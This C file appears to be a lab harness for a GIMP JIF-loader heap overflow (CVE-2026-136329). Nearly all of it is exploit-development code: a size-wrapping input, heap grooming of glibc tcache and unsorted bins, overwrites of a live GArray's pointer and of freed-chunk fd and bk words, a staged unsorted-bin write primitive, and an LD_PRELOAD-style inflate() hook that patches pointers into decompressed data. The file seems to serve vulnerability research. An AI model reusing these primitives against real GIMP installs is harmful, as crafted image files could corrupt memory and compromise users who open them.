/* Real-consumer probe for CVE-2026-136329 (GIMP ReadJeffsImage JIF).
 *
 * The pinned function below is INCLUDED VERBATIM from ../pins/. Only the
 * surrounding consumer is supplied here: real glib 2.80 types/allocator and
 * real zlib 1.3 are linked; GimpImage, GError consumption and ReadOK are
 * thin stand-ins. No GIMP/GEGL plugin and no PDB file-load path is built.
 *
 * Heap experiment: allocate a 256-byte glib chunk, then a LIVE GString
 * immediately after it, free the first chunk (glibc tcache), then let the
 * pinned ReadJeffsImage() allocate `indexes` (data_size = 260) into that
 * freed chunk. Real zlib writes 324 bytes into a 264-byte usable chunk, so
 * the following live GString's fields must be overwritten with chosen
 * input bytes. Readback uses memcpy of the struct bytes so no corrupted
 * pointer is ever dereferenced.
 */
#define _GNU_SOURCE
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <zlib.h>
#include <dlfcn.h>

typedef void GimpImage;
#define _(s) (s)
static const char *g_error_msg = "";
#define read_error(msg, img, err) do { (void) (img); (void) (err); g_error_msg = (msg); } while (0)

typedef struct { guchar transparent; } GifColor;
static GifColor Gif89 = { 0x2a };

/* ReadOK(): in-memory chunk stream for the staged modes, real FILE* reads
 * for `file`/`fileptr` modes driven by an on-disk JIF99a artifact. */
static guchar stream_bytes[4096];
static size_t stream_len = 0;
static size_t stream_pos = 0;
static FILE *stream_file = NULL;

static gboolean
ReadOK (FILE *fd, void *buf, size_t n)
{
  if (stream_file)
    return fread (buf, 1, n, stream_file) == n;
  if (stream_pos + n > stream_len)
    return FALSE;
  memcpy (buf, stream_bytes + stream_pos, n);
  stream_pos += n;
  return TRUE;
}

#ifdef VARIANT_FIXED
#include "../pins/jif-fixed.inc"
#else
#include "../pins/jif-vulnerable.inc"
#endif

static unsigned char payload_byte = 0x4d;
static unsigned char payload[512];
static int payload_custom = 0;
static void *consume_B = NULL;
/* Lab-arranged fake chunk for the unsorted-bin write experiment. The
 * fake chunk starts 16 bytes before this buffer, so fake->fd is the
 * first word of fake_buf. */
static unsigned char fake_buf[64] __attribute__((aligned (16)));

/* Simulated preload shim: interpose the pin's single inflate() call and,
 * only in `unlinkpatch` mode, write live pointer words into the already
 * decompressed bytes. No pinned source is changed. This tests whether the
 * W294 fake-chunk primitive survives a shim patch made *after* real zlib
 * has written the file-chosen payload — the missing primitive for a live
 * plugin preload shim. An LD_PRELOAD library would use the same hook. */
static int (*real_inflate_fn) (z_streamp, int) = NULL;
static int patch_armed = 0;
static int patch_hits = 0;
static void *patch_fd = NULL;
static void *patch_bk = NULL;

int
inflate (z_streamp strm, int flush)
{
  unsigned char *out = strm ? strm->next_out : NULL;
  if (! real_inflate_fn)
    real_inflate_fn = (int (*) (z_streamp, int)) dlsym (RTLD_NEXT, "inflate");
  if (! real_inflate_fn)
    {
      fprintf (stderr, "dlsym(RTLD_NEXT,inflate) failed\n");
      exit (2);
    }
  int rc = real_inflate_fn (strm, flush);
  if (patch_armed && out && strm->total_out >= 324)
    {
      size_t sz = 0x111;
      memcpy (out + 264, &sz, sizeof sz);
      memcpy (out + 272, &patch_fd, sizeof patch_fd);
      memcpy (out + 280, &patch_bk, sizeof patch_bk);
      patch_armed = 0;
      patch_hits++;
    }
  return rc;
}


/* Build a JIF-style chunk stream whose zlib payload inflates to `outlen`
 * copies of the chosen payload byte (same construction as harness/driver.c). */
static void
build_stream (size_t outlen)
{
  guchar plain[4096];
  guchar zbuf[4096];
  uLongf zlen = sizeof zbuf;
  size_t i, off = 0;

  for (i = 0; i < outlen; i++)
    plain[i] = payload_custom ? payload[i] : payload_byte;
  if (compress2 (zbuf, &zlen, plain, (uLong) outlen, 9) != Z_OK)
    {
      fprintf (stderr, "compress2 failed\n");
      exit (2);
    }
  while (off < zlen)
    {
      size_t chunk = zlen - off;
      if (chunk > 255)
        chunk = 255;
      stream_bytes[stream_len++] = (guchar) chunk;
      memcpy (stream_bytes + stream_len, zbuf + off, chunk);
      stream_len += chunk;
      off += chunk;
    }
  stream_bytes[stream_len++] = 0;
  stream_pos = 0;
}

static void
hexdump (const unsigned char *p, size_t n)
{
  for (size_t i = 0; i < n; i++)
    printf ("%02x", p[i]);
  printf ("\n");
}

/* Parse an on-disk JIF99a header using the field layout of the pinned
 * load_image(): 6-byte magic, 7-byte screen descriptor, optional global
 * colormap, extension blocks, ',' + 9-byte frame descriptor, code-size byte.
 * A graphics-control extension with a transparent index sets alpha_frame.
 * GIMP object/palette construction is the only omitted part of load_image(). */
static int
parse_jif_header (FILE *fd, gint *len, gint *height, gboolean *alpha,
                  guchar *bpp, gint *screenw, gint *screenh)
{
  guchar buf[768], c, size;

  if (! ReadOK (fd, buf, 6) || strncmp ((char *) buf, "JIF99a", 6))
    return 0;
  if (! ReadOK (fd, buf, 7))
    return 0;
  *screenw = buf[0] + (buf[1] << 8);
  *screenh = buf[2] + (buf[3] << 8);
  if ((buf[4] & 0x80) && ! ReadOK (fd, buf, 3 * (1 << ((buf[4] & 7) + 1))))
    return 0;
  *alpha = FALSE;
  while (ReadOK (fd, &c, 1))
    {
      if (c == ';')
        return 0;
      if (c == '!')
        {
          if (! ReadOK (fd, &c, 1))
            return 0;
          if (c == 0xf9)
            {
              if (! ReadOK (fd, &size, 1) || size < 4 ||
                  ! ReadOK (fd, buf, size))
                return 0;
              if (buf[0] & 0x01)
                {
                  Gif89.transparent = buf[3];
                  *alpha = TRUE;
                }
            }
          while (ReadOK (fd, &size, 1) && size)
            if (! ReadOK (fd, buf, size))
              return 0;
          continue;
        }
      if (c != ',' || ! ReadOK (fd, buf, 9))
        return 0;
      *len    = buf[4] + (buf[5] << 8);
      *height = buf[6] + (buf[7] << 8);
      if ((buf[8] & 0x80) &&
          ! ReadOK (fd, buf, 3 * (1 << ((buf[8] & 7) + 1))))
        return 0;
      return ReadOK (fd, &c, 1) ? (*bpp = c, 1) : 0;
    }
  return 0;
}

int
main (int argc, char **argv)
{
  setvbuf (stdout, NULL, _IONBF, 0);
  const char *mode = (argc > 1) ? argv[1] : "attack";
  int consume_mode = (! strcmp (mode, "consume") || ! strcmp (mode, "consumesz") ||
                      ! strcmp (mode, "consume-safe") || ! strcmp (mode, "unlink") ||
                      ! strcmp (mode, "unlinkpatch"));
  int consume_safe = ! strcmp (mode, "consume-safe");
  int unlink_mode = (! strcmp (mode, "unlink") || ! strcmp (mode, "unlinkpatch"));
  int patch_mode = ! strcmp (mode, "unlinkpatch");

  int caller_mode = (! strcmp (mode, "caller") || ! strcmp (mode, "callerpub"));
  int file_mode = (! strcmp (mode, "file") || ! strcmp (mode, "fileptr") ||
                   caller_mode);
  FILE *jif = NULL;
  guchar bpp = 8;
  unsigned char chosen_ptr[8] = { 0x43, 0x42, 0x41, 0x00, 0x00, 0x7f, 0x00, 0x00 };
  guchar dest[8192];
  guchar *caller_dest = NULL;
  GimpImage *image = NULL;
  GError *error = NULL;
  gint len, height, screenw = 0, screenh = 0;
  gboolean alpha;
  guint parsed_ds = 0;
  size_t outlen, i, changed = 0;
  gboolean rc;

  if (argc > 2 && ! file_mode)
    payload_byte = (unsigned char) strtoul (argv[2], NULL, 16);

  if (file_mode)
    {
      if (argc < 3 || ! (jif = fopen (argv[2], "rb")))
        {
          fprintf (stderr, "cannot open JIF file\n");
          return 2;
        }
      stream_file = jif;
      if (! parse_jif_header (jif, &len, &height, &alpha, &bpp,
                              &screenw, &screenh))
        {
          fprintf (stderr, "JIF header parse failed\n");
          return 2;
        }
      parsed_ds = (guint) ((unsigned) len * (unsigned) height);
      if (alpha)
        parsed_ds *= 2;
      printf ("FILE_FIELDS len=%d height=%d bpp=%u alpha=%d product=0x%08x data_size=%u\n",
              len, height, bpp, alpha ? 1 : 0,
              (unsigned) (len * height),
              (unsigned) (len * height * (alpha ? 2 : 1)));
    }

  /* Reproduce the pinned ReadImage() caller conditions before the call:
   * file-gif-load-vulnerable.c:1348 size guard and :1376 dest allocation.
   * The guard divides by G_MAXSIZE (64-bit on this host), so a wrapped
   * 32-bit product is not rejected. g_try_malloc probes the same glib
   * allocator without the g_malloc abort on failure; if it returned NULL
   * the real plugin would terminate before reaching ReadJeffsImage(). */
  if (caller_mode)
    {
      gsize dest_size = (gsize) len * (gsize) height * (alpha ? 2 : 1);
      gsize limit = G_MAXSIZE / (gsize) height / (alpha ? 2 : 1);
      int guard_passes = (len > limit) ? 0 : 1;
      printf ("CALLER screen=%dx%d len=%d height=%d alpha=%d limit=%zu\n",
              screenw, screenh, len, height, alpha ? 1 : 0, limit);
      printf ("GUARD_PASSES=%d DEST_SIZE=%zu\n", guard_passes, dest_size);
      caller_dest = (guchar *) g_try_malloc (dest_size);
      printf ("DEST_ALLOC=%s DEST_PTR=%p\n",
              caller_dest ? "OK" : "NULL", (void *) caller_dest);
      if (! caller_dest)
        return 3;
      memset (caller_dest, 0x5a, 16);
      printf ("DEST_FIRST=%02x\n", caller_dest[0]);
    }

  if (consume_safe)
    {
      len = 4; height = 4; alpha = FALSE; outlen = 16;
    }
  else if (! strcmp (mode, "safe"))
    {
      len = 4; height = 4; alpha = FALSE; outlen = 16;
    }
  else if (! file_mode)
    {
      /* len * height = 0x80000082; alpha doubling wraps data_size to 260
       * while zs.avail_out stays the unwrapped 0x80000082. */
      len = 2; height = 1073741889; alpha = TRUE; outlen = 324;
    }
  /* Optional chosen-address probe: put a valid pointer to a benign local
   * buffer at decompressed offset 272, which lands on the live GArray's
   * first field (data). No dereference of the overwritten field follows. */
  unsigned char benign[64];
  memcpy (benign, "BENIGN_MARKER", 14);
  if (! strcmp (mode, "ptr"))
    {
      void *chosen = (void *) benign;
      memset (payload, payload_byte, sizeof payload);
      memcpy (payload + 272, &chosen, sizeof chosen);
      payload_custom = 1;
      printf ("CHOSEN_PTR=%p PAYLOAD_OFFSET=272\n", chosen);
    }
  if (consume_mode && ! consume_safe && ! unlink_mode)

    {
      size_t sz = ! strcmp (mode, "consumesz")
        ? (size_t) 0x210 : (size_t) 0x4d4d4d4d4d4d4d4dUL;
      memset (payload, payload_byte, sizeof payload);
      memcpy (payload + 264, &sz, sizeof sz);
      payload_custom = 1;
      printf ("CONSUME_SIZE_WORD=%016zx PAYLOAD_OFFSET=264\n", sz);
    }

  /* Downstream-consumer mode: B is the 260-byte chunk the pin reuses as
   * `indexes`; the following chunk A is free in glibc's 272-byte smallbin.
   * Chosen bytes from the JIF overwrite A's size/fd/bk words at B+264,
   * and a post-pin 260-byte allocation makes glibc read that corrupted
   * metadata. No pointer from the file is dereferenced by this driver. */
  if (consume_mode)
    {

      void *fill[7];
      void *guard0 = g_try_malloc (260);
      consume_B = g_try_malloc (260);
      void *victim_A = g_try_malloc (260);
      void *guard1 = g_try_malloc (260);
      printf ("LAYOUT consume guard0=%p B=%p A=%p guard1=%p "
              "delta_BA=%td usable_B=%zu\n",
              guard0, consume_B, victim_A, guard1,
              (ptrdiff_t) ((char *) victim_A - (char *) consume_B),
              malloc_usable_size (consume_B));
      for (i = 0; i < 7; i++)
        {
          fill[i] = g_try_malloc (260);
          memset (fill[i], 0x5a, 260);
        }
      for (i = 0; i < 7; i++)
        g_free (fill[i]);             /* 260-byte tcache bin full */
      void *drop = g_try_malloc (260); /* room for B; A still in use */
      g_free (consume_B);             /* B is tcache head (count 6 -> 7) */
      g_free (victim_A);              /* tcache full: A to unsorted */
      printf ("LAYOUT consume prepared B=%p A=%p drop=%p\n",
              consume_B, victim_A, drop);

      /* Unsorted-bin write experiment. Keep A's original size word so
       * the next-chunk and exact-fit checks pass; supply the live arena
       * unsorted pointer in A->fd and a lab-arranged fake chunk in A->bk
       * whose fd word already equals the victim chunk A. glibc's
       * `bck->fd = unsorted_chunks (av)` then writes to fake_buf[0..7]. */
      void *unsorted = NULL;
      void *fakechunk = (void *) ((char *) fake_buf - 16);
      unsigned char fake_before[32], fake_after[32];
      if (unlink_mode)
        {
          size_t sz = 0x111;        /* original size, PREV_INUSE set */
          unsorted = *(void **) victim_A;  /* A->fd after the free */
          memset (fake_buf, 0x5a, sizeof fake_buf);
          void *chunk_A = (void *) ((char *) victim_A - 16);
          memcpy (fake_buf, &chunk_A, sizeof chunk_A);
          void *bin_ptr = (void *) ((char *) unsorted + 0x100);
          memcpy ((char *) fake_buf + 8, &bin_ptr, sizeof bin_ptr);





          memcpy (fake_before, fake_buf, sizeof fake_before);
          memset (payload, payload_byte, sizeof payload);
          if (patch_mode)
            {
              patch_fd = unsorted;
              patch_bk = fakechunk;
              patch_armed = 1;
              printf ("PATCH_ARMED=1 fd=%p bk=%p\n", patch_fd, patch_bk);
            }
          else
            {
              memcpy (payload + 264, &sz, sizeof sz);
              memcpy (payload + 272, &unsorted, sizeof unsorted);
              memcpy (payload + 280, &fakechunk, sizeof fakechunk);
            }
          payload_custom = 1;
          printf ("UNLINK_SETUP fake=%p fd_slot=%p bk_slot=%p "
                  "unsorted=%p bin=%p victim_user=%p victim_chunk=%p\n",
                  fakechunk, (void *) fake_buf, (void *) (fake_buf + 8),
                  unsorted, bin_ptr, victim_A, chunk_A);

          printf ("UNLINK_FAKE_BEFORE=");
          hexdump (fake_before, sizeof fake_before);

        }
      build_stream (outlen);


      rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha,
                           &image, &error);
      printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
              mode, payload_byte, rc ? 1 : 0, g_error_msg);
      printf ("POST_PIN A_size_word=%016zx A_fd=%016zx A_bk=%016zx\n",
              *(size_t *) ((char *) consume_B + 264),
              *(size_t *) ((char *) consume_B + 272),
              *(size_t *) ((char *) consume_B + 280));

      if (patch_mode)
        printf ("PATCH_HITS=%d\n", patch_hits);

      for (int k = 0; k < 10; k++)
        {
          void *after = g_try_malloc (260);
          printf ("POST_PIN malloc260[%d]=%p\n", k, after);
          if (unlink_mode && k == 7)
            printf ("UNLINK_RETURN_VICTIM=%d\n", after == victim_A);
          if (unlink_mode && k == 8)
            printf ("UNLINK_RETURN_FAKE=%d\n", after == fake_buf);

          if (unlink_mode)
            {
              void *fd_now = NULL;
              memcpy (&fd_now, fake_buf, sizeof fd_now);
              printf ("UNLINK_FD_NOW[%d]=%p MATCH_UNSORTED=%d\n",
                      k, fd_now, fd_now == unsorted);
            }

        }
      if (unlink_mode)
        {
          void *fd_after = NULL;
          memcpy (fake_after, fake_buf, sizeof fake_after);
          memcpy (&fd_after, fake_buf, sizeof fd_after);
          printf ("UNLINK_FAKE_AFTER=");
          hexdump (fake_after, sizeof fake_after);
          printf ("UNLINK_FD_MATCH=%d FD_CHANGED=%d\n",
                  fd_after == unsorted,
                  !! memcmp (fake_before, fake_after, sizeof fake_before));
          printf ("UNLINK_FD_WORD_CHANGED=%d\n",
                  !! memcmp (fake_before, fake_after, 8));

        }
      return 0;
    }

  /* Groom the real glib/glibc heap: a freed 272-byte chunk immediately
   * followed by a live GLib container. GArray's control struct is
   * malloc-allocated (GString uses GSlice magazines). */
  size_t groom_bytes = file_mode ? (parsed_ds > 16 ? 256 : 8) : 256;
  unsigned char *groom = g_malloc (groom_bytes);
  memset (groom, 0x5a, groom_bytes);
  printf ("LAYOUT groom=%p usable=%zu\n", (void *) groom,
          malloc_usable_size (groom));
  GArray *live = g_array_new (FALSE, FALSE, 1);
  unsigned char marker[128];
  memset (marker, 0x43, sizeof marker);
  g_array_append_vals (live, marker, sizeof marker);
  printf ("LAYOUT live_struct=%p live_data=%p delta=%td\n",
          (void *) live, (void *) live->data,
          (ptrdiff_t) ((char *) live - (char *) groom));
  unsigned char before[48], after[48];
  memcpy (before, live, sizeof before);

  g_free (groom);  /* tcache: pinned g_try_malloc() should reuse this chunk */
  if (! file_mode)
    build_stream (outlen);
  rc = ReadJeffsImage (NULL, caller_dest ? caller_dest : dest,
                       file_mode ? bpp : 8,
                       len, height, alpha, &image, &error);

  printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
          mode, payload_byte, rc ? 1 : 0, g_error_msg);
  if (caller_mode)
    {
      printf ("DEST_HEX=");
      hexdump (caller_dest, 320);
    }
  printf ("LIVE_BEFORE=");
  hexdump (before, sizeof before);
  memcpy (after, live, sizeof after);
  printf ("LIVE_AFTER=");
  hexdump (after, sizeof after);
  for (i = 0; i < sizeof after; i++)
    changed += (after[i] != before[i]);
  printf ("LIVE_CHANGED_BYTES=%zu\n", changed);
  if (! strcmp (mode, "ptr"))
    {
      void *got = NULL;
      memcpy (&got, after, sizeof got);
      printf ("PTR_FIELD=%p PTR_MATCH=%d\n", got, got == (void *) benign);
    }
  if (! strcmp (mode, "fileptr"))
    {
      printf ("PTR_FIELD=");
      hexdump (after, sizeof chosen_ptr);
      printf ("PTR_MATCH=%d\n",
              ! memcmp (after, chosen_ptr, sizeof chosen_ptr));
    }

  /* Never dereference live->data after a possible overwrite. */
  return 0;
}
